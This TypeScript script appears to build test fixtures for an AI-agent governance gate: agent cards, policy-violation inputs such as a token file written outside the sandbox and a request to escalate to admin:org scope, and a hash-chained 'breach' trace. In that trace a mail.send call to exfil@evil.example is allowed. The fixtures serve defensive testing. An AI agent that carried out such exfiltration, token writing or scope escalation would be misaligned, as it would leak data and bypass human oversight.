import { writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { cardFromDeclaration, writeCard } from "../card/export.ts";
import { loadDeclarations } from "../declare/load.ts";
import { approvalFingerprint } from "../lib/redact.ts";
import { repoRoot } from "../lib/paths.ts";
import { sha256Canonical, genesisHash } from "../lib/hash.ts";
import { buildTraceRecord } from "../trace/append.ts";
import type { AgentCard, Decision } from "../types.ts";

const SHIPPED_AT = "2026-09-07T00:00:00.000Z";

const decls = loadDeclarations();
mkdirSync(join(repoRoot(), "cards"), { recursive: true });
const cards: AgentCard[] = [];
for (const row of decls) {
  const card = cardFromDeclaration(row.data, SHIPPED_AT);
  writeCard(card, join(repoRoot(), "cards"));
  cards.push(card);
}

const writer = cards.find((c) => c.metadata.name === "sandbox-writer")!;
const reader = cards.find((c) => c.metadata.name === "evidence-reader")!;

const fp = approvalFingerprint("fs.write", {
  path: "fixtures/sandbox/approved-note.txt",
  content: "sandbox-ok",
});
mkdirSync(join(repoRoot(), "fixtures", "approvals"), { recursive: true });
writeFileSync(
  join(repoRoot(), "fixtures", "approvals", "one.json"),
  `${JSON.stringify({ fingerprints: [fp] }, null, 2)}\n`,
);

function gateInput(card: AgentCard, name: string, args: Record<string, unknown>, extra: Record<string, unknown> = {}) {
  return {
    card,
    call: { name, arguments: args },
    context: {
      session_id: "00000000-0000-4000-8000-000000000099",
      call_index: 0,
      prior_decisions: [],
      approvals: [],
      approval_fingerprint: approvalFingerprint(name, args),
      ...extra,
    },
  };
}

const authCard: AgentCard = {
  ...reader,
  tools: [
    ...reader.tools,
    {
      name: "auth.request_scopes",
      data_access: "none",
      data_classes: ["credential"],
      requires_approval: false,
      allowed_scopes: ["repo"], // type field
    },
    {
      name: "fs.write",
      data_access: "write",
      data_classes: ["filesystem"],
      requires_approval: false,
    },
  ],
  sandbox: { write_paths: ["fixtures/sandbox/"] },
};

mkdirSync(join(repoRoot(), "fixtures", "gate-input"), { recursive: true });
const inputs: Record<string, unknown> = {
  "in-scope.json": gateInput(reader, "repo.read_settings", { repository: "acme-corp/web" }),
  "unknown-tool.json": gateInput(reader, "proc.exec", {}),
  "data-class-violation.json": gateInput(reader, "fs.read", { path: "fixtures/fs/a.txt", token: "syn" }),
  "write-outside-sandbox.json": gateInput(authCard, "fs.write", { path: "/tmp/gh-token.json", content: "x" }),
  "scope-expansion.json": gateInput(authCard, "auth.request_scopes", { scopes: ["admin:org"] }),
  "needs-approval.json": gateInput(writer, "fs.write", {
    path: "fixtures/sandbox/approved-note.txt",
    content: "sandbox-ok",
  }),
};
for (const [name, value] of Object.entries(inputs)) {
  writeFileSync(join(repoRoot(), "fixtures", "gate-input", name), `${JSON.stringify(value, null, 2)}\n`);
}

function fixtureCard(overrides: Partial<AgentCard> & { metadata: AgentCard["metadata"]; classification: AgentCard["classification"]; escalation: AgentCard["escalation"] }): AgentCard {
  return {
    spec_version: "1.0.0",
    card_type: "agent",
    autonomy: { level: "supervised", human_in_loop: true },
    tools: reader.tools,
    sandbox: { write_paths: [] },
    decision_boundaries: reader.decision_boundaries,
    governance: reader.governance,
    evidence: reader.evidence,
    ...overrides,
  };
}

const stale = fixtureCard({
  metadata: { id: "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeee1", name: "stale", owner: "qa@acme.example", exported_at: SHIPPED_AT },
  classification: { risk_tier: "low", next_review: "2020-01-01" },
  escalation: { kill_switch: { available: true } },
});
const highNoKill = fixtureCard({
  metadata: { id: "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeee2", name: "high-no-kill", owner: "qa@acme.example", exported_at: SHIPPED_AT },
  classification: { risk_tier: "high", next_review: "2027-12-31" },
  escalation: { kill_switch: { available: false } },
});
const zero = fixtureCard({
  metadata: { id: "00000000-0000-0000-0000-000000000000", name: "zero", owner: "qa@acme.example", exported_at: SHIPPED_AT },
  classification: { risk_tier: "low", next_review: "2027-12-31" },
  escalation: { kill_switch: { available: true } },
});
mkdirSync(join(repoRoot(), "fixtures", "cards"), { recursive: true });
writeFileSync(join(repoRoot(), "fixtures", "cards", "stale.card.json"), `${JSON.stringify(stale, null, 2)}\n`);
writeFileSync(join(repoRoot(), "fixtures", "cards", "high-no-killswitch.card.json"), `${JSON.stringify(highNoKill, null, 2)}\n`);
writeFileSync(join(repoRoot(), "fixtures", "cards", "zero-uuid.card.json"), `${JSON.stringify(zero, null, 2)}\n`);

const breachCardSha = reader.metadata.canonical_sha256 ?? sha256Canonical(reader);
const decisions: Array<{ tool: string; args: Record<string, unknown>; decision: Decision }> = [
  {
    tool: "repo.list",
    args: { owner: "acme-corp" },
    decision: { effect: "allow", rule_ids: ["COL-GATE-ALLOW"], reasons: ["in scope"] },
  },
  {
    tool: "mail.send",
    args: { to: "exfil@evil.example", subject: "x", body: "y" },
    decision: { effect: "allow", rule_ids: ["COL-GATE-ALLOW"], reasons: ["breach fixture: executed out of card"] },
  },
];
let prev = genesisHash();
const lines: string[] = [];
decisions.forEach((d, i) => {
  const rec = buildTraceRecord({
    sessionId: "bbbbbbbb-cccc-4ddd-8eee-ffffffffffff",
    callIndex: i,
    tool: d.tool,
    args: d.args,
    decision: d.decision,
    cardSha256: breachCardSha,
    prevHash: prev,
  });
  rec.ts = `2026-09-07T00:00:0${i}.000Z`;
  const { hash: _ignored, ...rest } = rec;
  const rebuilt = { ...rest, hash: sha256Canonical(rest) };
  prev = rebuilt.hash;
  lines.push(JSON.stringify(rebuilt));
});
writeFileSync(join(repoRoot(), "fixtures", "traces", "breach.jsonl"), `${lines.join("\n")}\n`);

console.log("shipped cards", cards.map((c) => c.metadata.id).join(", "));
console.log("approval fingerprint", fp);
console.log("writer tools", writer.tools.length);
